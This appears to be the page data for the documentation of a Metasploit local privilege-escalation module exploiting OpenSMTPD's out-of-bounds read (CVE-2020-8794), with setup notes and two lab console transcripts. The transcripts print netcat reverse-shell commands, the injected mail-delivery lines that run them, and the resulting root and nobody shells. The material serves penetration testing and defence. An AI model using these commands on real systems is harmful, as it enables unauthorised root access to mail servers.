{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/unix/local/opensmtpd_oob_read_lpe","result":{"data":{"moduleMetadataJson":{"id":"bd211241-962a-5e37-9ae9-f8126f42c95e","name":"OpenSMTPD OOB Read Local Privilege Escalation","fullname":"exploit/unix/local/opensmtpd_oob_read_lpe","description":"This module exploits an out-of-bounds read of an attacker-controlled\n        string in OpenSMTPD's MTA implementation to execute a command as the\n        root or nobody user, depending on the kind of grammar OpenSMTPD uses.","rank":200,"fields":{"detailsSlug":"/modules/details/exploit/unix/local/opensmtpd_oob_read_lpe","documentationSlug":"/modules/documentation/exploit/unix/local/opensmtpd_oob_read_lpe","referencesSlug":"/modules/references/exploit/unix/local/opensmtpd_oob_read_lpe"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<h3 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h3>\n<p>This module exploits an out-of-bounds read of an attacker-controlled\nstring in OpenSMTPD's MTA implementation to execute a command as the\nroot or nobody user, depending on the kind of grammar OpenSMTPD uses.</p>\n<h3 id=\"setup\" style=\"position:relative;\"><a href=\"#setup\" aria-label=\"setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Setup</h3>\n<ol>\n<li>Download <a href=\"https://cdn.openbsd.org/pub/OpenBSD/6.6/amd64/install66.iso\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">OpenBSD 6.6</a></li>\n<li>Install the system</li>\n</ol>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>Follow <a href=\"#setup\">Setup</a> and <a href=\"#scenarios\">Scenarios</a>.</p>\n<h2 id=\"targets\" style=\"position:relative;\"><a href=\"#targets\" aria-label=\"targets permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Targets</h2>\n<h3 id=\"0\" style=\"position:relative;\"><a href=\"#0\" aria-label=\"0 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>0</h3>\n<p>This targets OpenSMTPD versions &#x3C; 6.6.4 by automatically selecting the\nappropriate grammar.</p>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<h3 id=\"session\" style=\"position:relative;\"><a href=\"#session\" aria-label=\"session permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SESSION</h3>\n<p>Set this to a valid session ID on an OpenBSD target.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"opensmtpd-660-on-openbsd-66\" style=\"position:relative;\"><a href=\"#opensmtpd-660-on-openbsd-66\" aria-label=\"opensmtpd 660 on openbsd 66 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>OpenSMTPD 6.6.0 on OpenBSD 6.6</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/unix/local/opensmtpd_oob_read_lpe\nmsf5 exploit(unix/local/opensmtpd_oob_read_lpe) &gt; options\n\nModule options (exploit/unix/local/opensmtpd_oob_read_lpe):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   SESSION                   yes       The session to run this module on.\n   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0\n   SRVPORT  25               yes       The local port to listen on.\n   SSL      false            no        Negotiate SSL for incoming connections\n   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)\n\n\nPayload options (cmd/unix/reverse_netcat):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST                   yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   OpenSMTPD &lt; 6.6.4 (automatic grammar selection)\n\n\nmsf5 exploit(unix/local/opensmtpd_oob_read_lpe) &gt; set lhost 172.16.249.1\nlhost =&gt; 172.16.249.1\nmsf5 exploit(unix/local/opensmtpd_oob_read_lpe) &gt; set session 1\nsession =&gt; 1\nmsf5 exploit(unix/local/opensmtpd_oob_read_lpe) &gt; run\n\n[+] mkfifo /tmp/gkhbba; nc 172.16.249.1 4444 0&lt;/tmp/gkhbba | /bin/sh &gt;/tmp/gkhbba 2&gt;&amp;1; rm /tmp/gkhbba\n[!] SESSION may not be compatible with this module.\n[*] Started reverse TCP handler on 172.16.249.1:4444\n[*] Executing automatic check (disable AutoCheck to override)\n[*] OpenSMTPD 6.6.0 is using new grammar\n[+] The target appears to be vulnerable. OpenSMTPD 6.6.0 appears vulnerable to CVE-2020-8794.\n[*] Started service listener on 0.0.0.0:25\n[*] Executing local sendmail(8) command: /usr/sbin/sendmail &#39;brvaysxuzssmnjkysoh@[172.16.249.1]&#39; &lt; /dev/null &amp;&amp; echo true\n[*] Client 172.16.249.137:37747 connected\n[*] Exploiting new OpenSMTPD grammar for a root shell\n[*] Faking SMTP server and sending exploit\n[*] Sending: 220\n[*] Expecting: /EHLO /\n[+] Received: EHLO\n[*] Sending: 250\n[*] Expecting: /MAIL FROM:&lt;[^&gt;]/\n[+] Received: foo.localdomain\nMAIL FROM:&lt;w\n[*] Sending: 553-\n553\n\ndispatcher: local_mail\ntype: mda\nmda-user: root\nmda-exec: mkfifo /tmp/rettgqm; nc 172.16.249.1 4444 0&lt;/tmp/rettgqm | /bin/sh &gt;/tmp/rettgqm 2&gt;&amp;1; rm /tmp/rettgqm; exit 0\n\n[*] Disconnecting client 172.16.249.137:37747\n[*] Command shell session 3 opened (172.16.249.1:4444 -&gt; 172.16.249.137:3005) at 2020-03-03 18:40:54 -0600\n[*] Server stopped.\n\nid\nuid=0(root) gid=0(wheel) groups=0(wheel)\nuname -a\nOpenBSD foo.localdomain 6.6 GENERIC#353 amd64\n^Z\nBackground session 3? [y/N]  y</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"opensmtpd-604-on-openbsd-63\" style=\"position:relative;\"><a href=\"#opensmtpd-604-on-openbsd-63\" aria-label=\"opensmtpd 604 on openbsd 63 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>OpenSMTPD 6.0.4 on OpenBSD 6.3</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(unix/local/opensmtpd_oob_read_lpe) &gt; set session 2\nsession =&gt; 2\nmsf5 exploit(unix/local/opensmtpd_oob_read_lpe) &gt; run\n\n[+] mkfifo /tmp/hkioy; nc 172.16.249.1 4444 0&lt;/tmp/hkioy | /bin/sh &gt;/tmp/hkioy 2&gt;&amp;1; rm /tmp/hkioy\n[!] SESSION may not be compatible with this module.\n[*] Started reverse TCP handler on 172.16.249.1:4444\n[*] Executing automatic check (disable AutoCheck to override)\n[*] OpenSMTPD 6.0.4 is using old grammar\n[+] The target appears to be vulnerable. OpenSMTPD 6.0.4 appears vulnerable to CVE-2020-8794.\n[*] Started service listener on 0.0.0.0:25\n[*] Executing local sendmail(8) command: /usr/sbin/sendmail &#39;nozahdogyxewkv@[172.16.249.1]&#39; &lt; /dev/null &amp;&amp; echo true\n[*] Client 172.16.249.138:10203 connected\n[*] Exploiting old OpenSMTPD grammar for a nobody shell\n[*] Faking SMTP server and sending exploit\n[*] Sending: 220\n[*] Expecting: /EHLO /\n[+] Received: EHLO\n[*] Sending: 250\n[*] Expecting: /MAIL FROM:&lt;[^&gt;]/\n[+] Received: foo.localdomain\nMAIL FROM:&lt;w\n[*] Sending: 553-\n553\n\ntype: mda\nmda-method: mda\nmda-usertable: &lt;getpwnam&gt;\nmda-user: nobody\nmda-buffer: mkfifo /tmp/jszy; nc 172.16.249.1 4444 0&lt;/tmp/jszy | /bin/sh &gt;/tmp/jszy 2&gt;&amp;1; rm /tmp/jszy; exit 0\n\n[*] Disconnecting client 172.16.249.138:10203\n[*] Command shell session 4 opened (172.16.249.1:4444 -&gt; 172.16.249.138:40377) at 2020-03-03 18:41:06 -0600\n[*] Server stopped.\n\nid\nuid=32767(nobody) gid=32767(nobody) groups=32767(nobody)\nuname -a\nOpenBSD foo.localdomain 6.3 GENERIC#100 amd64</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"bd211241-962a-5e37-9ae9-f8126f42c95e"}}}